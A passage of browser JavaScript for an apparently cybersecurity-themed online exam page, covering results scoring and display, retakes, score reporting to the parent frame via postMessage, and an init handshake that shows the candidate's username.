      if (u >= 0) { showScreen('exam'); renderExercise(u); } else { finishExam(false); }
    });
    var fin = el('button', 'btn btn-primary', '⏹ Final submit');
    fin.type = 'button'; fin.setAttribute('aria-label', 'Final submit and show results');
    fin.addEventListener('click', function () { finishExam(false); });
    acts.appendChild(back); acts.appendChild(el('span', 'spacer')); acts.appendChild(fin);
    c.appendChild(acts);
    root.appendChild(c);
  }

  /* ---------------- results ---------------- */
  function finishExam(timeout) {
    var anySkippedOpen = S.skipped.some(function (i) { return S.answers[i].status === 'skipped'; });
    if (!timeout && anySkippedOpen && S.timerState !== 'ENDED' && S.screen !== 'review') { renderReview(); showScreen('review'); return; }
    setTimerState('ENDED');
    var r = creditSum();
    var answered = r.n;
    var percent = answered > 0 ? Math.round((r.sum / answered) * 100) : 0;
    var passed = percent >= (META.passMark || 70);
    /* counts */
    var full = 0, part = 0, zero = 0, skipped = 0, partSum = 0;
    EXERCISES.forEach(function (ex, i) {
      var st = S.answers[i].status;
      if (st === 'checked') {
        var cr = S.answers[i].credit;
        if (cr >= 1) full++;
        else if (cr > 0) { part++; partSum += cr; }
        else zero++;
      } else if (st === 'skipped') skipped++;
      else skipped++; /* unanswered at submit = excluded */
    });
    var root = $('screen-results'); root.innerHTML = '';
    var hero = el('div', 'card');
    var verdictTxt = passed ? '✓ PASS' : '✗ FAIL';
    hero.appendChild(el('div', 'res-hero',
      '<div><div class="res-score">' + percent + '%<small> · ' + r.sum.toFixed(1) + ' / ' + answered + ' credits</small></div>' +
      '<div class="dd-hint">scored over answered exercises only — skipped and never-answered are excluded</div></div>' +
      '<div class="verdict ' + (passed ? 'pass' : 'fail') + '">' + verdictTxt + '</div>'));
    root.appendChild(hero);
    var grid = el('div', 'res-grid');
    function cell(n, l, cls, ic) { return '<div class="res-cell"><div class="rc-n ' + (cls || '') + '">' + n + '</div><div class="rc-l"><span>' + ic + '</span><span>' + l + '</span></div></div>'; }
    grid.innerHTML =
      cell(full, 'Fully correct', 'ok-c', '✓') +
      cell(part + (part > 0 ? ' <small style="font-size:.8rem;color:var(--text-secondary)">(avg ' + (partSum / part).toFixed(2) + ')</small>' : ''), 'Partially correct', 'no-c', '✓') +
      cell(zero, 'Fully incorrect', 'no-c', '✗') +
      cell(skipped, 'Skipped — excluded', 'mi-c', '⚠');
    var gcard = el('div', 'card'); gcard.appendChild(grid);
    gcard.appendChild(el('div', 'dd-hint', '⏸ Time paused manually: ' + fmtTime(Math.round(S.manualPauseMs / 1000)) + ' · ⏸ Time reviewing feedback (auto-pause): ' + fmtTime(Math.round(S.autoPauseMs / 1000)) + ' · ⏱ Time used: ' + fmtTime((META.estimatedMinutes * 60) - S.remaining) + (timeout ? ' (timer ran out)' : '')));
    /* per-exercise strip */
    var strip = el('div', 'strip');
    EXERCISES.forEach(function (ex, i) {
      var st = S.answers[i].status, cr = S.answers[i].credit;
      var cls = st === 'checked' ? (cr >= 1 ? 'st-ok' : cr > 0 ? 'st-pa' : 'st-no') : 'st-sk';
      var ic = st === 'checked' ? (cr >= 1 ? '✓' : cr > 0 ? '±' : '✗') : '⚠';
      var chip = el('span', 'st-chip ' + cls, ic);
      chip.title = ex.id + (st === 'checked' ? ' — credit ' + cr.toFixed(2) : ' — skipped/excluded');
      chip.setAttribute('aria-label', chip.title);
      strip.appendChild(chip);
    });
    gcard.appendChild(strip);
    root.appendChild(gcard);
    var acts = el('div', 'actions');
    var rt = el('button', 'btn btn-primary', '↺ Retake the exam');
    rt.type = 'button'; rt.setAttribute('aria-label', 'Retake the exam');
    rt.addEventListener('click', retake);
    acts.appendChild(rt);
    root.appendChild(el('div', 'card', '')).appendChild(acts);
    showScreen('results');
    /* report exactly once per attempt */
    if (!S.reported) {
      S.reported = true;
      reportScore(r.sum, answered);
    }
  }
  function retake() {
    S.answers = EXERCISES.map(function () { return { status: 'unanswered', credit: 0, hintUsed: false, wstate: {}, result: null, label: '' }; });
    S.skipped = []; S.current = 0; S.reviewMode = false; S.reported = false; S.attempt++;
    S.manualPauseMs = 0; S.autoPauseMs = 0; S.priorState = null;
    buildShuffles();
    setTimerState('RUNNING'); S.remaining = (META.estimatedMinutes || 15) * 60;
    showScreen('exam'); renderExercise(0);
  }
  function reportScore(creditSumV, answeredCount) {
    var percent = answeredCount > 0 ? Math.round((creditSumV / answeredCount) * 100) : 0;
    try {
      parent.postMessage({
        type: 'CYBERPULSE_SCORE',
        topicId: META.topicId,
        batch: META.batch,
        score: Math.round(creditSumV),
        total: answeredCount,
        percent: percent,
        passed: percent >= 70
      }, location.origin);
    } catch (e) { /* opened directly rather than inside the site — nothing to report to */ }
  }

  /* ---------------- handshake ---------------- */
  window.addEventListener('message', function (event) {
    if (!event.data) return;
    var type = event.data.type;
    if (type !== 'CYBERPULSE_INIT' && type !== 'CYBERMASTERY_INIT') return;
    try {
      if (event.data.username) {
        var c = $('tbCandidate');
        c.textContent = '👤 ' + String(event.data.username).slice(0, 24);
        c.classList.remove('hidden');
      }
      /* country, locale, topicId, batch are consumed; theme is always 'dark' — this file is dark-only by contract */
    } catch (e) { }
  });

  /* ---------------- boot ---------------- */
  function boot() {
    S.answers = EXERCISES.map(function () { return { status: 'unanswered', credit: 0, hintUsed: false, wstate: {}, result: null, label: '' }; });
    buildShuffles();
    $('tbTitle').textContent = META.title;
    $('tbSevWord').textContent = META.severityLabel;
    renderIntro();
    showScreen('intro');
  }
  window.__CP_BOOT__ = boot;
})();
